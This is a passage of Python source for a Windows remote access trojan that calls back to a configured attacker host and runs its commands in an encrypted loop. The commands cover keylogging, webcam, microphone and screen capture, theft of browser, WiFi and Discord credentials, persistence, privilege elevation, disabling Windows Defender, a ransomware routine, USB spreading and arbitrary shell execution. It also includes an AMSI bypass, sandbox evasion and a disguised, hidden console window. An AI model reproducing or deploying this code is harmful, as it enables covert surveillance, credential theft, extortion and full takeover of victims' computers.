        ]
        for path in paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                            software_list.append(f"{name} - v{version}")
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                pass
        return '\n'.join(sorted(set(software_list)))
    except Exception as e:
        return f"Software enumeration failed: {str(e)}"

def play_sound(frequency=1000, duration=500):
    try:
        import winsound
        winsound.Beep(frequency, duration)
        return f"[+] Played {frequency}Hz beep for {duration}ms"
    except Exception as e:
        return f"Sound playback failed: {str(e)}"

def get_browser_history(browser='chrome', limit=50):
    try:
        if browser.lower() == 'chrome':
            history_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
        elif browser.lower() == 'edge':
            history_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
        else:
            return "Unsupported browser"
        if not os.path.exists(history_path):
            return f"{browser} history not found"
        temp_db = os.path.join(tempfile.gettempdir(), 'history_temp.db')
        shutil.copy2(history_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(f'SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}')
        history = []
        for row in cursor.fetchall():
            url, title, visit_time = row
            history.append({'url': url, 'title': title if title else '[No title]'})
        conn.close()
        os.remove(temp_db)
        return json.dumps(history, indent=2)
    except Exception as e:
        return f"History extraction failed: {str(e)}"

def take_photo_burst(count=3):
    try:
        photos = []
        cap = cv2.VideoCapture(0)
        for i in range(count):
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                photos.append(base64.b64encode(buffer).decode())
            time.sleep(0.5)
        cap.release()
        cv2.destroyAllWindows()
        return json.dumps({'count': len(photos), 'photos': photos})
    except Exception as e:
        return f"Photo burst failed: {str(e)}"

def enumerate_usb_devices():
    try:
        devices = []
        output = subprocess.check_output('wmic path Win32_USBControllerDevice get Dependent', shell=True)
        lines = output.decode('utf-8', errors='ignore').split('\n')
        for line in lines:
            if 'USB' in line:
                devices.append(line.strip())
        return '\n'.join(devices) if devices else "No USB devices found"
    except Exception as e:
        return f"USB enumeration failed: {str(e)}"

def remote_shutdown(delay=60):
    try:
        subprocess.run(f'shutdown /s /t {delay}', shell=True)
        return f"[+] System shutdown scheduled in {delay} seconds (User can cancel with 'shutdown /a')"
    except Exception as e:
        return f"Shutdown failed: {str(e)}"

def remote_lock_screen():
    try:
        ctypes.windll.user32.LockWorkStation()
        return "[+] Workstation locked"
    except Exception as e:
        return f"Lock failed: {str(e)}"
# ═══════════════════════════════════════════════════════════════
# MAIN CONNECTION HANDLER & COMMAND ROUTING
# ═══════════════════════════════════════════════════════════════

def connect_to_server(host, port, key):
    """Main connection handler with all features integrated"""
    
    advanced_amsi_bypass()
    
    if not enhanced_sandbox_detection():
        sys.exit()
    
    keylogger = KeyLogger()
    keylogger.start()
    
    ai_behavior = AdaptiveBehavior()
    clipboard_monitor = None
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(60)  # Set timeout to prevent hanging
        
        admin_status = "[ADMIN]" if check_admin() else "[USER]"
        hostname = os.environ.get('COMPUTERNAME', 'Unknown')
        s.send(encrypt_data(key, f"{admin_status} Connection from {hostname}"))
        
        while True:
            try:
                data = s.recv(8192)
                if not data:
                    break
                
                command = decrypt_data(key, data)
                
                if not command:
                    break
                
                # Exit
                if command.lower() == 'exit':
                    break
                
                # System info
                elif command.lower() == 'sysinfo':
                    output = system_info()
                    s.send(encrypt_data(key, output))
                
                # Screenshot
                elif command.lower() == 'screenshot':
                    s.send(encrypt_data(key, "Taking screenshot..."))
                    screenshot = take_screenshot()
                    s.send(encrypt_data(key, screenshot))
                
                # Webcam
                elif command.lower() == 'webcam':
                    s.send(encrypt_data(key, "Capturing webcam..."))
                    webcam = capture_webcam()
                    s.send(encrypt_data(key, webcam))
                
                # Keylogs
                elif command.lower() == 'keylogs':
                    logs = keylogger.get_logs()
                    s.send(encrypt_data(key, logs))
                
                # Audio recording
                elif command.lower().startswith('record '):
                    try:
                        duration = int(command.split()[1])
                        s.send(encrypt_data(key, f"[*] Recording audio for {duration} seconds..."))
                        audio = record_audio(duration)
                        s.send(encrypt_data(key, audio))
                    except:
                        s.send(encrypt_data(key, "[-] Invalid duration. Usage: record <seconds>"))
                
                # Clipboard
                elif command.lower() == 'clipboard':
                    if clipboard_monitor is None:
                        clipboard_monitor = ClipboardMonitor()
                        clipboard_monitor.start()
                        s.send(encrypt_data(key, "[+] Clipboard monitoring started"))
                    else:
                        output = clipboard_monitor.get_logs()
                        s.send(encrypt_data(key, output))
                
                # Passwords
                elif command.lower() == 'passwords':
                    output = "=== CHROME ===\n" + get_chrome_passwords()
                    output += "\n\n=== EDGE ===\n" + get_edge_passwords()
                    output += "\n\n=== FIREFOX ===\n" + get_firefox_passwords()
                    s.send(encrypt_data(key, output))
                
                # WiFi
                elif command.lower() == 'wifi':
                    output = get_wifi_passwords()
                    s.send(encrypt_data(key, output))
                
                # Discord
                elif command.lower() == 'discord':
                    output = get_discord_tokens()
                    s.send(encrypt_data(key, output))
                
                # Processes
                elif command.lower() == 'processes':
                    output = list_processes()
                    s.send(encrypt_data(key, output))
                
                # Kill process
                elif command.lower().startswith('kill '):
                    try:
                        pid = command.split()[1]
                        output = kill_process(pid)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: kill <PID>"))
                
                # Download file
                elif command.lower().startswith('download '):
                    try:
                        filepath = command[9:].strip()
                        output = download_file(filepath)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: download <filepath>"))
                
                # Upload file
                elif command.lower().startswith('upload '):
                    parts = command.split(' ', 2)
                    if len(parts) == 3:
                        output = upload_file(parts[1], parts[2])
                        s.send(encrypt_data(key, output))
                    else:
                        s.send(encrypt_data(key, "[-] Usage: upload <path> <base64_data>"))
                
                # Persistence
                elif command.lower() == 'persist':
                    methods = multi_persistence()
                    if methods:
                        s.send(encrypt_data(key, f"[+] Persistence added via: {', '.join(methods)}"))
                    else:
                        s.send(encrypt_data(key, "[-] All persistence methods failed"))
                
                # Elevate
                elif command.lower() == 'elevate':
                    if not check_admin():
                        try:
                            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                            s.send(encrypt_data(key, "[*] Elevation attempted, new admin connection should appear..."))
                            time.sleep(2)
                            sys.exit()
                        except Exception as e:
                            s.send(encrypt_data(key, f"[-] Elevation failed: {str(e)}"))
                    else:
                        s.send(encrypt_data(key, "[+] Already running as admin"))
                
                # Defender off
                elif command.lower() == 'defenderoff':
                    if check_admin():
                        if disable_defender():
                            s.send(encrypt_data(key, "[+] Windows Defender disabled"))
                        else:
                            s.send(encrypt_data(key, "[-] Defender disable failed"))
                    else:
                        s.send(encrypt_data(key, "[-] Requires admin privileges. Use 'elevate' first"))
                
                # Ransomware
                elif command.lower().startswith('ransom '):
                    try:
                        target = command[7:].strip()
                        output = simulate_ransomware(target)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: ransom <directory_path>"))
                
                # Spread
                elif command.lower() == 'spread':
                    output = spread_to_usb()
                    s.send(encrypt_data(key, output))
                
                # Netscan
                elif command.lower() == 'netscan':
                    s.send(encrypt_data(key, "[*] Scanning network... (this may take 1-2 minutes)"))
                    output = network_scan()
                    s.send(encrypt_data(key, output))
                
                # Self-destruct
                elif command.lower() == 'selfdestruct':
                    s.send(encrypt_data(key, self_destruct()))
                    time.sleep(1)
                    sys.exit()
                
                # Message box
                elif command.lower().startswith('msgbox '):
                    try:
                        parts = command[7:].split('|')
                        if len(parts) >= 2:
                            title, message = parts[0].strip(), parts[1].strip()
                            output = display_message_box(title, message)
                            s.send(encrypt_data(key, output))
                        else:
                            s.send(encrypt_data(key, "[-] Usage: msgbox <title>|<message>"))
                    except Exception as e:
                        s.send(encrypt_data(key, f"[-] Error: {str(e)}"))
                
                # Flip screen
                elif command.lower() == 'flipscreen':
                    output = fun_desktop_prank()
                    s.send(encrypt_data(key, output))
                
                # Timelapse
                elif command.lower().startswith('timelapse '):
                    try:
                        parts = command.split()
                        interval = int(parts[1]) if len(parts) > 1 else 5
                        count = int(parts[2]) if len(parts) > 2 else 10
                        s.send(encrypt_data(key, f"[*] Taking {count} screenshots every {interval} seconds..."))
                        output = screenshot_timelapse(interval, count)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: timelapse <interval_seconds> <count>"))
                
                # Locate
                elif command.lower() == 'locate':
                    s.send(encrypt_data(key, "[*] Getting geolocation..."))
                    output = get_geolocation()
                    s.send(encrypt_data(key, output))
                
                # Software
                elif command.lower() == 'software':
                    s.send(encrypt_data(key, "[*] Enumerating installed software... (this may take 30 seconds)"))
                    output = get_installed_software()
                    s.send(encrypt_data(key, output))
                
                # Beep
                elif command.lower().startswith('beep '):
                    try:
                        parts = command.split()
                        freq = int(parts[1]) if len(parts) > 1 else 1000
                        dur = int(parts[2]) if len(parts) > 2 else 500
                        output = play_sound(freq, dur)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: beep <frequency> <duration_ms>"))
                
                # History
                elif command.lower().startswith('history '):
                    try:
                        browser = command.split()[1]
                        output = get_browser_history(browser)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: history <chrome|edge>"))
                
                # Metrics
                elif command.lower() == 'metrics':
                    output = get_system_metrics()
                    s.send(encrypt_data(key, output))
                
                # Burst
                elif command.lower().startswith('burst '):
                    try:
                        count = int(command.split()[1])
                        s.send(encrypt_data(key, f"[*] Taking {count} rapid photos..."))
                        output = take_photo_burst(count)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: burst <photo_count>"))
                
                # USB
                elif command.lower() == 'usb':
                    output = enumerate_usb_devices()
                    s.send(encrypt_data(key, output))
                
                # Shutdown
                elif command.lower().startswith('shutdown '):
                    try:
                        delay = int(command.split()[1]) if len(command.split()) > 1 else 60
                        output = remote_shutdown(delay)
                        s.send(encrypt_data(key, output))
                    except:
                        s.send(encrypt_data(key, "[-] Usage: shutdown <delay_seconds>"))
                
                # Lock
                elif command.lower() == 'lock':
                    output = remote_lock_screen()
                    s.send(encrypt_data(key, output))
                
                # Change directory
                elif command.lower().startswith('cd '):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        s.send(encrypt_data(key, f"[+] Changed directory to: {os.getcwd()}"))
                    except Exception as e:
                        s.send(encrypt_data(key, f"[-] Error: {str(e)}"))
                
                # Shell command (default)
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
                        s.send(encrypt_data(key, output.decode('utf-8', errors='ignore')))
                    except subprocess.TimeoutExpired:
                        s.send(encrypt_data(key, "[-] Command timed out after 30 seconds"))
                    except Exception as e:
                        s.send(encrypt_data(key, f"[-] Error: {str(e)}"))
            
            except Exception as e:
                continue
        
        s.close()
    except Exception as e:
        time.sleep(60)
        connect_to_server(host, port, key)

# ═══════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    HOST = CALLBACK_IP      # From umbrella_config.yaml
    PORT = CALLBACK_PORT    # From umbrella_config.yaml
    KEY = ENCRYPTION_KEY    # From umbrella_config.yaml
    
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass
    
    signature = calculate_signature()
    connect_to_server(HOST, PORT, KEY)